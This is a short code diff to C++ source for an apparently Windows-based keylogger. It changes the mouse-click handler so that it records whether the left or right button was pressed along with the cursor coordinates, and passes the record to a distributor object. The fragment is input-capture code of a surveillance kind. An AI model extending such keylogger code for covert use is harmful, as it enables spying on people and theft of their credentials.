@@ -90,12 +90,12 @@ void Keylogger::keyReleased(LPKBDLLHOOKSTRUCT key)
 	}
 }
 
-void Keylogger::mouseClick(LPMSLLHOOKSTRUCT mouse)
+void Keylogger::mouseClick(MouseEvent me, LPMSLLHOOKSTRUCT mouse)
 {
 	std::unique_ptr<AInputType> input(new InputMouse);
-	std::string data;
+	std::string data = (me == MouseEvent::ME_Left) ? "LEFT " : "RIGHT ";
 
-	data = std::to_string(mouse->pt.x) + ", " + std::to_string(mouse->pt.y);
+	data += std::to_string(mouse->pt.x) + ", " + std::to_string(mouse->pt.y);
 	*_distributor << (*input << data);
 }
 
